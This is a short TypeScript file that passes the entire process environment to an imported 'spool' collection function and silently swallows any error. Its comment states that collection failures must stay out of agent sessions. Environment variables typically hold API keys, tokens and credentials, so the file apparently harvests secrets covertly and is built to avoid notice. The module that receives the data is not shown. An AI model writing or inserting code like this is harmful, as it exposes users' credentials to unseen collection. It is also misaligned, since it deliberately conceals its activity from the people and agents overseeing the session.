import { spool } from "./spool.ts";
try {
  spool(process.env);
} catch {
  /* Collection failures must stay out of agent sessions. */
}
